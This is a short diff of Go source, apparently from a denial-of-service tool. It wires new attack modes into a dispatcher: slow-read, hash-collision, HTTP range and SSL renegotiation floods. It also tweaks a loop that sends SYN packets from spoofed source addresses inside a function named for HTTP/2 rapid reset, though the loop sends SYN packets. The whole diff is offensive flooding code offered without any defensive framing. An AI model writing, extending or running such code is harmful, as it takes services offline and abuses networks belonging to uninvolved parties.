@@ -70,6 +70,27 @@ func (d *Dispatcher) Run(done chan struct{}) {
 		return
 	}
 
+	if method == "slowread" {
+		f := NewSlowReadFlooder(d.cfg)
+		f.Run(done)
+		return
+	}
+	if method == "hashcollision" || method == "hashdos" {
+		f := NewHashCollisionFlooder(d.cfg)
+		f.Run(done)
+		return
+	}
+	if method == "rangeflood" || method == "range" {
+		f := NewRangeFlooder(d.cfg)
+		f.Run(done)
+		return
+	}
+	if method == "sslreneg" {
+		f := NewSSLRenegFlooder(d.cfg)
+		f.Run(done)
+		return
+	}
+
 	targetIP := d.cfg.Target
 	targetPort := d.cfg.Port
 	workers := d.cfg.Workers
@@ -247,6 +268,7 @@ func (d *Dispatcher) runH2RapidReset(done chan struct{}) {
 				spoof := spoofPool[rand.Intn(len(spoofPool))]
 				for time.Now().Before(deadline) && !d.stopped() {
 					SendSYN(d.cfg.Target, d.cfg.Port, spoof)
+					time.Sleep(time.Microsecond)
 				}
 			}()
 		}
